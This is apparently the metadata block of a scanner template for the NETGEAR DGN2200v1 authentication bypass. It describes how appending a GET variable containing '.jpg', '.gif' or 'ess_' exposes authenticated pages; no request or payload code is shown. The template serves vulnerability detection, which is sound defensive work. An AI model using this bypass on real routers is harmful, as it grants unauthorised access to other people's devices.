info:
  name: NETGEAR DGN2200v1 - Authentication Bypass
  author: gy741
  severity: high
  description: NETGEAR DGN2200v1 router contains an authentication bypass vulnerability. It does not require authentication if a page has ".jpg", ".gif", or "ess_" substrings but matches the entire URL. Any page on the device can therefore be accessed, including those that require authentication, by appending a GET variable with the relevant substring.
